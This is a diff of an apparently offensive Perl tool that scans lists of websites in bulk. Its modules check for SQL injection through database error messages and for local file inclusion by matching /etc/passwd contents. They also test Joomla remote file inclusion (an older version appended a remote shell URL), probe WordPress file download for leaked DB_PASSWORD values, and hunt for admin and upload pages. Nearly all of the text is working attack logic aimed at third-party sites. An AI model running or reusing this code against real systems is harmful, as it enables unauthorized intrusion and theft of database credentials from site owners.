-        if ($html =~ m/ODBC Microsoft Access Driver/i) { print "MS-Access_ODBC ";}
-        if ($html =~ m/Microsoft JET Database/i) { print "MS-Access_JETdb ";}
-        if ($html =~ m/Microsoft OLE DB Provider for ODBC Drivers error/i) { print "Microsoft OLE DB Provider for ODBC Drivers error ";}
-        if ($html =~ m/Invalid Querystring/i) { print "Invalid Querystring ";}
-        if ($html =~ m/LE DB Provider for ODBC/i) { print "OLE DB Provider for ODBC ";}
-        if ($html =~ m/VBScript Runtime/i) { print "VBScript Runtime ";}
-        if ($html =~ m/ADODB.Field/i) { print "ADODB.Field ";}
-        if ($html =~ m/ADODB.Command/i) { print "ADODB.Command ";}
-        if ($html =~ m/BOF or EOF/i) { print "BOF or EOF ";}
-        if ($html =~ m/JET Database/i) { print "JET Database ";}
-        if ($html =~ m/Syntax error/i) { print "Syntax error ";}
-        if ($html =~ m/FetchRow()/i) { print "FetchRow() ";}
-        if ($html =~ m/Input string was not in a correct format/i) { print "Input string was not in a correct format ";}
-        if ($html =~ m/PostgreSQL/i) { print "postgresql.util ";}
-        if ($html =~ m/system.data/i) { print "JDBC ";}
-        if ($html =~ m/Not found/i) { print "Not found ";}
-        print "\n";
-		open (INFO, '>>scan.txt');
-        print INFO "$printarget\n";
-        close (INFO);
-	  }else{
-	    print color 'red';
-        print "Not Vulnerable! \n";
-	    print color RESET;
-	  }
+      $yes = 'MySQL|syntax|SQL|mysql_fetch_assoc|num_rows|ORA-01756|PostgreSQL|internal server error';
+      $no = 'not found|404|not exist|ErrorDocument|Forbidden|The page you requested couldn\'t be found';
+	  checkedurl();
     }
 	print "[ ]............................................................................ \n";
   }
   close(TEXT);
-  if ((!defined $sqlmap) && (!defined $mlfi) && (!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mmails) && (!defined $mports)) {
-    finmodule();
+  if (-e "xss".getlist()) {unlink "xss_".getlist();}
+  if (-e 'scan.txt') {
+    use File::Copy qw(copy);
+    copy 'scan.txt', "xss_".getlist();
+	fincontinuemodule();
+	print color 'green';
+    print "[!] Results saved in $Bin/xss_".getlist()."!\n";
+	print color RESET;
+    subfin();
   }else{
-	if (-e 'scan.txt') {
-      if (-e "xss_".getlist()) {unlink "xss_".getlist();}
-      use File::Copy qw(copy);
-      copy 'scan.txt', "xss_".getlist();
-	  fincontinuemodule();
-	  print color 'green';
-      print "[!] Results saved in $Bin/xss_".getlist()."!\n";
-	  print color RESET;
-	}else{
-      print color 'red';
-      print "No Results Found!\n";
-	  timer();
-      print "SCAN FINISHED!\n";
-      print color RESET;
-	  if (defined $sqlmap) {
-        finmodule();
-	  }
-	}
-	unlink 'scan.txt' if !defined $sqlmap;
+	print color 'red';
+    print "[!] No Results Found!\n";
+    subfin();
+  }
+  if ((!defined $sqlmap) && (!defined $mlfi) && (!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mmails) && (!defined $mports)) {
+    exit();
   }
 }
-###################################################################		
-###################################################################		
+############################################################################################################################################################################################
+############################################################################################################################################################################################
 ##bgn sqlmap 
 sub sqlmap {
   testconection();
-  if ((!defined $mlevel) && (!defined $validation_text) && (!defined $misup)){
+  if (!defined $mlevel){
     targetlist();
-	scandetail();
   }
   print color 'bold';
   print "[ ] ----------------------------------------------------------------------- [ ]\n";
@@ -1713,13 +1706,13 @@ sub sqlmap {
 	countsqllist();
 	print "]\n";
 	print color RESET;
-	print color 'bold yellow';
+	print color 'bold';
 	print "[!] TARGET: ";
 	print color RESET;
 	print color 'yellow';
     print "$URL \n";
 	print color RESET;
-    print color 'bold yellow';
+    print color 'bold';
     print "[+] EXPLOITATION: ";
     print color RESET;
 	print "Sqlmap \n\n";
@@ -1818,7 +1811,8 @@ sub sqlmap {
 	exit();
   }
 }
-###################################################################		
+############################################################################################################################################################################################
+############################################################################################################################################################################################
 ## bgn mlfi
 sub mlfi {
   if (-e 'scan.txt'){ unlink 'scan.txt';}
@@ -1826,7 +1820,6 @@ sub mlfi {
   LFI();
   if ((!defined $mlevel) && (!defined $validation_text) && (!defined $misup)){
     targetlist();
-	scandetail();
   }
   print color 'bold';
   print "[ ] ----------------------------------------------------------------------- [ ]\n";
@@ -1851,80 +1844,55 @@ sub mlfi {
 	countsearchlist();
 	print "]\n";
 	print color RESET;
-	print color 'bold yellow';
+	print color 'bold';
 	print "[!] TARGET: ";
 	print color RESET;
-	print color 'yellow';
+	print color 'blue';
 	print "$printarget\n";
 	print color RESET;
+    #$URL = control($URL);
 	foreach $LFI(@LFI){
-	  print color 'bold yellow';
+	  print color 'bold';
 	  print "    EXPL:   ";
 	  print color RESET;
       print "$LFI \n";
-	  print color 'bold yellow';
-	  print "    VULN:   ";
-	  print color RESET;
       $URL1 = $URL.$LFI;
 	  $URL1 =~ s/ //g;
-      $request = HTTP::Request->new('GET', $URL1);
-      my $response = $ua->request($request);
-      my $html = $response->content;
-	  my $status = $response->code;
-	  my $pattern = 'root:x|bin:x|nologin';
-	  if($html =~ m/$pattern/i ) {
-	    print color 'green';
-        print "$URL1\n";
-	    print color RESET;
-	    print color 'bold yellow';
-	    print "    HTTP:   ";
-	    print color RESET;
-	    print color 'green';
-	    print "HTTP/1.1 $status\n";
-	    print color RESET;
-		open (INFO, '>>scan.txt');
-        print INFO "$URL1\n";
-        close (INFO);
-	  }else{
-	    print color 'red';
-        print "Not Vulnerable! \n";
-	    print color RESET;
-	  }
+      $yes = 'root:x|bin:x|nologin';
+      $no = 'not found|404|not exist|ErrorDocument|Forbidden|The page you requested couldn\'t be found';
+	  checkedurl();
+	  print "    [ ]...................................................................... \n";
     }
 	print "[ ]............................................................................ \n";
   }
   close(TEXT);
-  if ((!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mmails) && (!defined $mports)) {
-    finmodule();
+  if (-e "lfi".getlist()) {unlink "lfi_".getlist();}
+  if (-e 'scan.txt') {
+    use File::Copy qw(copy);
+    copy 'scan.txt', "lfi_".getlist();
+	fincontinuemodule();
+	print color 'green';
+    print "[!] Results saved in $Bin/lfi_".getlist()."!\n";
+	print color RESET;
+    subfin();
   }else{
-	if (-e 'scan.txt') {
-      if (-e "lfi_".getlist()) {unlink "lfi_".getlist();}
-      use File::Copy qw(copy);
-      copy 'scan.txt', "lfi_".getlist();
-	  fincontinuemodule();
-	  print color 'green';
-      print "[!] Results saved in $Bin/lfi_".getlist()."!\n";
-	  print color RESET;
-	}else{
-      print color 'red';
-      print "No Results Found!\n";
-	  timer();
-      print "SCAN FINISHED!\n";
-      print color RESET;
-	}
-	unlink 'scan.txt';
+	print color 'red';
+    print "[!] No Results Found!\n";
+    subfin();
+  }
+  if ((!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mmails) && (!defined $mports)) {
+    exit();
   }
 }
-###################################################################		
-###################################################################		
+############################################################################################################################################################################################
+############################################################################################################################################################################################
 ## bgn mjoomrfi
 sub mjoomrfi {
   if (-e 'scan.txt'){ unlink 'scan.txt';}
   testconection();
   RFI();
-  if (!defined $mlevel) {
+  if ((!defined $mlevel) && (!defined $validation_text) && (!defined $misup)){
     targetlist();
-	scandetail();
   }
   print color 'bold';
   print "[ ] ----------------------------------------------------------------------- [ ]\n";
@@ -1952,85 +1920,54 @@ sub mjoomrfi {
 	countsearchlist();
 	print "]\n";
 	print color RESET;
-	print color 'bold yellow';
+	print color 'bold';
 	print "[!] TARGET: ";
 	print color RESET;
-	print color 'yellow';
+	print color 'blue';
 	print "$printarget\n";
 	print color RESET;
+    #$URL = control($URL);
 	foreach $RFI(@RFI){
-	  print color 'bold yellow';
+	  print color 'bold';
 	  print "    EXPL:   ";
 	  print color RESET;
       print "$RFI \n";
-	  print color 'bold yellow';
-	  print " SHELL:  ";
-	  print color RESET;
-      print "$shell \n";
-	  print color 'bold yellow';
-	  print "    VULN:   ";
-	  print color RESET;
-      $URL1 = $URL.$RFI.$shell;
+      $URL1 = $URL.$RFI;
 	  $URL1 =~ s/ //g;
-      $request = HTTP::Request->new('GET', $URL1);
-      my $response = $ua->request($request);
-      my $html = $response->content;
-	  my $status = $response->code;
-      my $pattern = 'r57shell|safe_mode|Executed|Shell';
-	  if ($html =~ m/$pattern/i){
-	    print color 'green';
-        print "$URL1\n";
-	    print color RESET;
-		
-	    print color 'bold yellow';
-	    print "    HTTP:   ";
-	    print color RESET;
-	    print color 'green';
-	    print "HTTP/1.1 $status\n";
-	    print color RESET;
-		
-		open (INFO, '>>scan.txt');
-        print INFO "$URL1\n";
-        close (INFO);
-	  }else{
-	    print color 'red';
-        print "Not Vulnerable! \n";
-	    print color RESET;
-	  }
+      $yes = 'r57shell|safe_mode|Executed|Shell';
+	  checkedurl();
+	  print "    [ ]...................................................................... \n";
     }
 	print "[ ]............................................................................ \n";
   }
   close(TEXT);
-  if ((!defined $mwpadf) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mmails) && (!defined $mports)) {
-    finmodule();
+  if (-e "rfi".getlist()) {unlink "rfi_".getlist();}
+  if (-e 'scan.txt') {
+    use File::Copy qw(copy);
+    copy 'scan.txt', "rfi_".getlist();
+	fincontinuemodule();
+	print color 'green';
+    print "[!] Results saved in $Bin/rfi_".getlist()."!\n";
+	print color RESET;
+    subfin();
   }else{
-	if (-e 'scan.txt') {
-      if (-e "rfi_".getlist()) {unlink "rfi_".getlist();}
-      use File::Copy qw(copy);
-      copy 'scan.txt', "rfi_".getlist();
-	  fincontinuemodule();
-	  print color 'green';
-      print "[!] Results saved in $Bin/rfi_".getlist()."!\n";
-	  print color RESET;
-	}else{
-      print color 'red';
-      print "No Results Found!\n";
-	  timer();
-      print "SCAN FINISHED!\n";
-      print color RESET;
-	}
-	unlink 'scan.txt';
+	print color 'red';
+    print "[!] No Results Found!\n";
+    subfin();
+  }
+  if ((!defined $mwpadf) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mmails) && (!defined $mports)) {
+    exit();
   }
 }
-###################################################################		
+############################################################################################################################################################################################
+############################################################################################################################################################################################
 ## bgn mwpadf
 sub mwpadf {
   if (-e 'scan.txt'){ unlink 'scan.txt';}
   testconection();
   ADFWP();
-  if (!defined $mlevel) {
+  if ((!defined $mlevel) && (!defined $validation_text) && (!defined $misup)){
     targetlist();
-	scandetail();
   }
   print color 'bold';
   print "[ ] ----------------------------------------------------------------------- [ ]\n";
@@ -2058,81 +1995,55 @@ sub mwpadf {
 	countsearchlist();
 	print "]\n";
 	print color RESET;
-	
-	print color 'bold yellow';
+	print color 'bold';
 	print "[!] TARGET: ";
 	print color RESET;
-	print color 'yellow';
+	print color 'blue';
 	print "$printarget\n";
 	print color RESET;
-    #$URL = control($URL);	
+    #$URL = control($URL);
 	foreach $ADFWP(@ADFWP){
-	  print color 'bold yellow';
+	  print color 'bold';
 	  print "    EXPL:   ";
 	  print color RESET;
       print "$ADFWP \n";
-	  print color 'bold yellow';
-	  print "    VULN:   ";
-	  print color RESET;
       $URL1 = $URL.$ADFWP;
 	  $URL1 =~ s/ //g;
-      $request = HTTP::Request->new('GET', $URL1);
-      my $response = $ua->request($request);
-      my $html = $response->content;
-	  my $status = $response->code;
-      my $pattern = 'DB_NAME|DB_USER|DB_PASSWORD';
-	  if ($response->is_success && $response->content =~ m/$pattern/i) {
-	    print color 'green';
-        print "$URL1\n";
-	    print color RESET;
-	    print color 'bold yellow';
-	    print "    HTTP:   ";
-	    print color RESET;
-	    print color 'green';
-	    print "HTTP/1.1 $status\n";
-	    print color RESET;
-		open (INFO, '>>scan.txt');
-        print INFO "$URL1\n";
-        close (INFO);
-	  }else{
-	    print color 'red';
-        print "Not Vulnerable! \n";
-	    print color RESET;
-	  }
+      $yes = 'DB_NAME|DB_USER|DB_PASSWORD';
+      $no = 'not found|404|not exist|ErrorDocument|Forbidden|The page you requested couldn\'t be found';
+	  checkedurl();
+	  print "    [ ]...................................................................... \n";
     }
 	print "[ ]............................................................................ \n";
   }
   close(TEXT);
-  if ((!defined $madmin) && (!defined $msubdomain) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mmails) && (!defined $mports)) {
-    finmodule();
+  if (-e "adf".getlist()) {unlink "adf_".getlist();}
+  if (-e 'scan.txt') {
+    use File::Copy qw(copy);
+    copy 'scan.txt', "adf_".getlist();
+	fincontinuemodule();
+	print color 'green';
+    print "[!] Results saved in $Bin/adf_".getlist()."!\n";
+	print color RESET;
+    subfin();
   }else{
-	if (-e 'scan.txt') {
-      if (-e "adf_".getlist()) {unlink "adf_".getlist();}
-      use File::Copy qw(copy);
-      copy 'scan.txt', "adf_".getlist();
-	  fincontinuemodule();
-	  print color 'green';
-      print "[!] Results saved in $Bin/adf_".getlist()."!\n";
-	  print color RESET;
-	}else{
-      print color 'red';
-      print "No Results Found!\n";
-	  timer();
-      print "SCAN FINISHED!\n";
-      print color RESET;
-	}
-	unlink 'scan.txt';
+	print color 'red';
+    print "[!] No Results Found!\n";
+    subfin();
+  }
+  if ((!defined $madmin) && (!defined $msubdomain) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mmails) && (!defined $mports)) {
+    exit();
   }
 }
-###################################################################		
+############################################################################################################################################################################################
+############################################################################################################################################################################################
 ## bgn madmin
 sub madmin {
   if (-e 'scan.txt'){ unlink 'scan.txt';}
   testconection();
   ADMIN();
-  if (!defined $mlevel) {
+ if ((!defined $mlevel) && (!defined $validation_text) && (!defined $misup)){
     targetlist();
-	scandetail();
   }
   print color 'bold';
   print "[ ] ----------------------------------------------------------------------- [ ]\n";
@@ -2147,7 +2058,7 @@ sub madmin {
     $count++;
 	chomp $URL;
     $URL = checkurltype($URL);
-	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
+    if($URL !~ /http:\/\//) { $URL = "http://$URL"; };
 	my $printarget = $URL;
 	if (index($URL, 'http://') != -1) {
 	  $URL =~ s/http:\/\///g;
@@ -2160,91 +2071,48 @@ sub madmin {
 	countsearchlist();
 	print "]\n";
 	print color RESET;
-	print color 'bold yellow';
+	print color 'bold';
 	print "[!] TARGET: ";
 	print color RESET;
-	print color 'yellow';
-    print "$printarget\n";
+	print color 'blue';
+	print "$printarget\n";
 	print color RESET;
+    #$URL = control($URL);
 	foreach $ADMIN(@ADMIN){
-	  $URL1 =~ s/ //g;
-      $request = HTTP::Request->new('GET', $URL1);
-      $response = $ua->request($request);
-      my $html = $response->content;
-	  my $status = $response->code;
-	  print color 'bold yellow';
+	  print color 'bold';
 	  print "    EXPL:   ";
 	  print color RESET;
       print "$ADMIN \n";
-	  print color 'bold yellow';
-	  print "    VULN:   ";
-	  print color RESET;
-      if ( $response->is_success and $response->previous ) {
-	    my $pattern = 'password|username|email|Password|cPanel|admin';
-	    my $no = '404|not fount|server error|error document';
-	    if (($html =~ m/$pattern/i) && ($html !~ m/$no/i)){
-	      print color 'green';
-          print '', $request->url, " "; 
-	      print color RESET;
-		  print color 'red';
-		  print "REDIRECT TO: \n";
-	      print color RESET;
-	      print color 'green';
-		  print '            => ', $response->request->uri, "\n";
-	      print color RESET;
-	      print color 'bold yellow';
-	      print "    HTTP:   ";
-	      print color RESET;
-	      print color 'green';
-	      print "HTTP/1.1 $status\n";
-	      print color RESET;
-	    } else {
-	      print color 'green';
-          print '  ',$response->request->uri, "\n";
-	      print color RESET;
-	      print color 'bold yellow';
-	      print "    HTTP:   ";
-	      print color RESET;
-	      print color 'green';
-	      print "HTTP/1.1 $status\n";
-	      print color RESET;
-	    }
-		$ul = $response->request->uri,;
-		open (INFO, '>>scan.txt');
-        print INFO "$ul\n";
-        close (INFO);
-	  }else{
-	    print color 'red';
-        print "Not Admin Page! \n";
-	    print color RESET;
-	  }
+      $URL1 = $URL.$ADMIN;
+	  $URL1 =~ s/ //g;
+      $yes = 'password|username|email|Password|cPanel|admin';
+      $no = 'not found|404|not exist|ErrorDocument|Forbidden|The page you requested couldn\'t be found';
+	  checkedurl();
+	  print "    [ ]...................................................................... \n";
     }
-	print "[ ]............................................................................ \n";
+    print "[ ] ----------------------------------------------------------------------- [ ]\n";
   }
   close(TEXT);
-  if ((!defined $msubdomain) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mmails) && (!defined $mports)) {
-    finmodule();
+  if (-e "admin".getlist()) {unlink "admin_".getlist();}
+  if (-e 'scan.txt') {
+    use File::Copy qw(copy);
+    copy 'scan.txt', "admin_".getlist();
+	fincontinuemodule();
+	print color 'green';
+    print "[!] Results saved in $Bin/admin_".getlist()."!\n";
+	print color RESET;
+    subfin();
   }else{
-	if (-e 'scan.txt') {
-      if (-e "admin_".getlist()) {unlink "admin_".getlist();}
-      use File::Copy qw(copy);
-      copy 'scan.txt', "admin_".getlist();
-	  fincontinuemodule();
-	  print color 'green';
-      print "[!] Results saved in $Bin/admin_".getlist()."!\n";
-	  print color RESET;
-	}else{
-      print color 'red';
-      print "No Results Found!\n";
-	  timer();
-      print "SCAN FINISHED!\n";
-      print color RESET;
-	}
-	unlink 'scan.txt';
+	print color 'red';
+    print "[!] No Results Found!\n";
+    subfin();
+  }
+  if ((!defined $msubdomain) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mmails) && (!defined $mports)) {
+    exit();
   }
 }
-
-###################################################################		
+############################################################################################################################################################################################
+############################################################################################################################################################################################
 ## bgn msubdomain
 sub msubdomain {
   if (-e 'scan.txt'){ unlink 'scan.txt';}
@@ -2282,10 +2150,10 @@ sub msubdomain {
 	countsearchlist();
 	print "]\n";
 	print color RESET;
-	print color 'bold yellow';
+	print color 'bold';
 	print "[!] TARGET: ";
 	print color RESET;
-	print color 'yellow';
+	print color 'blue';
 	print "$printarget\n";
 	print color RESET;
 	foreach $SUBDOMAIN(@SUBDOMAIN){
@@ -2295,12 +2163,12 @@ sub msubdomain {
       Proto=>'icmp',
       timeout=>1);
 	  
-	  print color 'bold yellow';
+	  print color 'bold';
 	  print "    EXPL:   ";
 	  print color RESET;
       print "$SUBDOMAIN \n";
 		
-	  print color 'bold yellow';
+	  print color 'bold';
 	  print "    INFO:   ";
 	  print color RESET;
 	  
@@ -2317,41 +2185,38 @@ sub msubdomain {
 	    print color RESET;
 	  }
 	  close $socket if defined $socket;
+	  print "    [ ]...................................................................... \n";
     }
 	print "[ ]............................................................................ \n";
   }
   close(TEXT);
-  if ((!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mmails) && (!defined $mports)) {
-    finmodule();
+  if (-e "subdomains".getlist()) {unlink "subdomains_".getlist();}
+  if (-e 'scan.txt') {
+    use File::Copy qw(copy);
+    copy 'scan.txt', "subdomains_".getlist();
+	fincontinuemodule();
+	print color 'green';
+    print "[!] Results saved in $Bin/subdomains_".getlist()."!\n";
+	print color RESET;
+    subfin();
   }else{
-	if (-e 'scan.txt') {
-      if (-e "subdomains_".getlist()) {unlink "subdomains_".getlist();}
-      use File::Copy qw(copy);
-      copy 'scan.txt', "subdomains_".getlist();
-	  fincontinuemodule();
-	  print color 'green';
-      print "[!] Results saved in $Bin/subdomains_".getlist()."!\n";
-	  print color RESET;
-	}else{
-      print color 'red';
-      print "No Results Found!\n";
-	  timer();
-      print "SCAN FINISHED!\n";
-      print color RESET;
-	}
-	unlink 'scan.txt';
+	print color 'red';
+    print "[!] No Results Found!\n";
+    subfin();
+  }
+  if ((!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mmails) && (!defined $mports)) {
+    exit();
   }
 }
-
-
-###################################################################		
+############################################################################################################################################################################################
+############################################################################################################################################################################################
 ## bgn mwpsites
 sub mwpsites {
   if (-e 'scan.txt'){ unlink 'scan.txt';}
   testconection();
   if (!defined $mlevel) {
     targetlist();
-	scandetail();
+	#scandetail();
   }
   print color 'bold';
   print "[ ] ----------------------------------------------------------------------- [ ]\n";
@@ -2379,71 +2244,55 @@ sub mwpsites {
 	countsearchlist();
 	print "]\n";
 	print color RESET;
-	print color RESET;
-	print color 'bold yellow';
+	print color 'bold';
 	print "[!] TARGET: ";
 	print color RESET;
+	print color 'blue';
 	print "$printarget\n";
- 	$query = "/wp-login.php";
-    $URL1 = $URL.$query;
-	$URL1 =~ s/ //g;
-    $request = HTTP::Request->new('GET', $URL1);
-    $response = $ua->request($request);
-    my $html = $response->content;
-	my $status = $response->code;
-    print color 'bold yellow';
-	print "    CMS:    ";
 	print color RESET;
-    if ($response->is_success and !$response->previous) {
-	  print color 'green';
-      print "Wordpress! \n";
+    $URL = control($URL);
+	foreach $WPCMS(@WPCMS){
+	  print color 'bold';
+	  print "    CMS:    ";
 	  print color RESET;
-	  print color 'bold yellow';
-	  print "    HTTP:   ";
-	  print color RESET;
-	  print color 'green';
-	  print "HTTP/1.1 $status\n";
-	  print color RESET;
-	  open (INFO, '>>scan.txt');
-      print INFO "$URL1\n";
-      close (INFO);
-	}else{
-	  print color 'red';
-      print "Not Wordpress! \n";
-	  print color RESET;
+      $URL1 = $URL.$WPCMS;
+	  $URL1 =~ s/ //g;
+	  $cms="Wordpress!";
+	  $yes = 'Username|Password|user_login|user_pass|submit|<meta name=\"generator\" content=\"WordPress';
+      $no = 'not found|404|not exist|ErrorDocument|Forbidden|The page you requested couldn\'t be found';
+	  checkedurl();
+      print "[ ]............................................................................ \n";
     }
 	print "[ ]............................................................................ \n";
   }
   close(TEXT);
-  if ((!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mmails) && (!defined $mports)) {
-    finmodule();
+  if (-e "wp".getlist()) {unlink "wp_".getlist();}
+  if (-e 'scan.txt') {
+    use File::Copy qw(copy);
+    copy 'scan.txt', "wp_".getlist();
+	fincontinuemodule();
+	print color 'green';
+    print "[!] Results saved in $Bin/wp_".getlist()."!\n";
+	print color RESET;
+    subfin();
   }else{
-	if (-e 'scan.txt') {
-      if (-e "wp_".getlist()) {unlink "wp_".getlist();}
-      use File::Copy qw(copy);
-      copy 'scan.txt', "wp_".getlist();
-	  fincontinuemodule();
-	  print color 'green';
-      print "[!] Results saved in $Bin/wp_".getlist()."!\n";
-	  print color RESET;
-	}else{
-      print color 'red';
-      print "No Results Found!\n";
-	  timer();
-      print "SCAN FINISHED!\n";
-      print color RESET;
-	}
-	unlink 'scan.txt';
+	print color 'red';
+    print "[!] No Results Found!\n";
+    subfin();
+  }
+  if ((!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mmails) && (!defined $mports)) {
+    exit();
   }
 }
-###################################################################		
+############################################################################################################################################################################################
+############################################################################################################################################################################################
 ## bgn mjoomsites
 sub mjoomsites {
   if (-e 'scan.txt'){ unlink 'scan.txt';}
   testconection();
   if (!defined $mlevel) {
     targetlist();
-	scandetail();
+	#scandetail();
   }
   print color 'bold';
   print "[ ] ----------------------------------------------------------------------- [ ]\n";
@@ -2471,73 +2320,55 @@ sub mjoomsites {
 	countsearchlist();
 	print "]\n";
 	print color RESET;
-	print color 'bold yellow';
+	print color 'bold';
 	print "[!] TARGET: ";
 	print color RESET;
-	print color 'yellow';
+	print color 'blue';
 	print "$printarget\n";
 	print color RESET;
- 	$query = "/administrator/index.php";
-    $URL1 = $URL.$query;
-	$URL1 =~ s/ //g;
-    $request = HTTP::Request->new('GET', $URL1);
-    $response = $ua->request($request);
-    my $html = $response->content;
-	my $status = $response->code;
-    print color 'bold yellow';
-	print "    CMS:   ";
-	print color RESET;
-    if ($response->is_success and !$response->previous) {
-	  print color 'green';
-      print "Joomla! \n";
+    $URL = control($URL);
+	foreach $JOOMCMS(@JOOMCMS){
+	  print color 'bold';
+	  print "    CMS:    ";
 	  print color RESET;
-	  print color 'bold yellow';
-	  print "    HTTP:   ";
-	  print color RESET;
-	  print color 'green';
-	  print "HTTP/1.1 $status\n";
-	  print color RESET;
-	  open (INFO, '>>scan.txt');
-      print INFO "$URL1\n";
-      close (INFO);
-	}else{
-	  print color 'red';
-      print "Not Joomla! \n";
-	  print color RESET;
+      $URL1 = $URL.$JOOMCMS;
+	  $URL1 =~ s/ //g;
+	  $cms="Joomla!";
+	  $yes = 'Joomla! Administration Login|Password|User Name|<meta name=\"generator\" content=\"Joomla! - Open Source Content Management|mod-login-password|mod-login-password';
+      $no = 'not found|404|not exist|ErrorDocument|Forbidden|The page you requested couldn\'t be found';
+	  checkedurl();
+      print "[ ]............................................................................ \n";
     }
 	print "[ ]............................................................................ \n";
   }
   close(TEXT);
-  if ((!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mmails) && (!defined $mports)) {
-    finmodule();
+  if (-e "joom".getlist()) {unlink "joom_".getlist();}
+  if (-e 'scan.txt') {
+    use File::Copy qw(copy);
+    copy 'scan.txt', "joom_".getlist();
+	fincontinuemodule();
+	print color 'green';
+    print "[!] Results saved in $Bin/joom_".getlist()."!\n";
+	print color RESET;
+    subfin();
   }else{
-	if (-e 'scan.txt') {
-      if (-e "joom_".getlist()) {unlink "joom_".getlist();}
-      use File::Copy qw(copy);
-      copy 'scan.txt', "joom_".getlist();
-	  fincontinuemodule();
-	  print color 'green';
-      print "[!] Results saved in $Bin/joom_".getlist()."!\n";
-	  print color RESET;
-	}else{
-      print color 'red';
-      print "No Results Found!\n";
-	  timer();
-      print "SCAN FINISHED!\n";
-      print color RESET;
-	}
-	unlink 'scan.txt';
+	print color 'red';
+    print "[!] No Results Found!\n";
+    subfin();
+  }
+  if ((!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mmails) && (!defined $mports)) {
+    exit();
   }
 }
-###################################################################		
+############################################################################################################################################################################################
+############################################################################################################################################################################################
 ## bgn muploadsites
 sub muploadsites {
   if (-e 'scan.txt'){ unlink 'scan.txt';}
   testconection();
   UPLOAD();
-  if (!defined $mlevel) {
+ if ((!defined $mlevel) && (!defined $validation_text) && (!defined $misup)){
     targetlist();
-	scandetail();
   }
   print color 'bold';
   print "[ ] ----------------------------------------------------------------------- [ ]\n";
@@ -2554,90 +2385,63 @@ sub muploadsites {
     $URL = checkurltype($URL);
 	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
 	my $printarget = $URL;
-	if (index($URL, 'http://') != -1) {
-	  $URL =~ s/http:\/\///g;
-	}
-	$URL =~ s/\/.*//s;
+	$URL =~ s/=.*/=/s;
 	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
-    print color 'bold magenta';
+	print color 'bold magenta';
 	timer();
 	print "[$count/";
 	countsearchlist();
 	print "]\n";
 	print color RESET;
-	print color 'bold yellow';
+	print color 'bold';
 	print "[!] TARGET: ";
 	print color RESET;
-	print color 'yellow';
+	print color 'blue';
 	print "$printarget\n";
 	print color RESET;
+    #$URL = control($URL);
 	foreach $UPLOAD(@UPLOAD){
-	  print color 'bold yellow';
+	  print color 'bold';
 	  print "    EXPL:   ";
 	  print color RESET;
       print "$UPLOAD \n";
-	  print color 'bold yellow';
-	  print "    VULN:   ";
-	  print color RESET;
       $URL1 = $URL.$UPLOAD;
 	  $URL1 =~ s/ //g;
-      $request = HTTP::Request->new('GET', $URL1);
-      my $response = $ua->request($request);
-      my $html = $response->content;
-	  my $status = $response->code;
-      if ($response->is_success and !$response->previous) {
-	    print color 'green';
-        print "$URL1\n";
-	    print color RESET;
-	    print color 'bold yellow';
-	    print "    HTTP:   ";
-	    print color RESET;
-	    print color 'green';
-	    print "HTTP/1.1 $status\n";
-	    print color RESET;
-		open (INFO, '>>scan.txt');
-        print INFO "$URL\n";
-        close (INFO);
-	  }else{
-	    print color 'red';
-        print "Not Vulnerable! \n";
-	    print color RESET;
-	  }
+	  $yes='a';
+      $no = 'iikiiiix';
+	  checkedurl();
+	  print "    [ ]...................................................................... \n";
     }
 	print "[ ]............................................................................ \n";
   }
   close(TEXT);
-  if ((!defined $mzip) && (!defined $command) && (!defined $mmails) && (!defined $mports)) {
-    finmodule();
+  if (-e "upload".getlist()) {unlink "upload_".getlist();}
+  if (-e 'scan.txt') {
+    use File::Copy qw(copy);
+    copy 'scan.txt', "upload_".getlist();
+	fincontinuemodule();
+	print color 'green';
+    print "[!] Results saved in $Bin/upload_".getlist()."!\n";
+	print color RESET;
+    subfin();
   }else{
-	if (-e 'scan.txt') {
-      if (-e "upload_".getlist()) {unlink "upload_".getlist();}
-      use File::Copy qw(copy);
-      copy 'scan.txt', "upload_".getlist();
-	  fincontinuemodule();
-	  print color 'green';
-      print "[!] Results saved in $Bin/upload_".getlist()."!\n";
-	  print color RESET;
-	}else{
-      print color 'red';
-      print "No Results Found!\n";
-	  timer();
-      print "SCAN FINISHED!\n";
-      print color RESET;
-	}
-	unlink 'scan.txt';
+	print color 'red';
+    print "[!] No Results Found!\n";
+    subfin();
+  }
+  if ((!defined $mzip) && (!defined $command) && (!defined $mmails) && (!defined $mports)) {
+    exit();
   }
 }
-###################################################################		
-###################################################################		
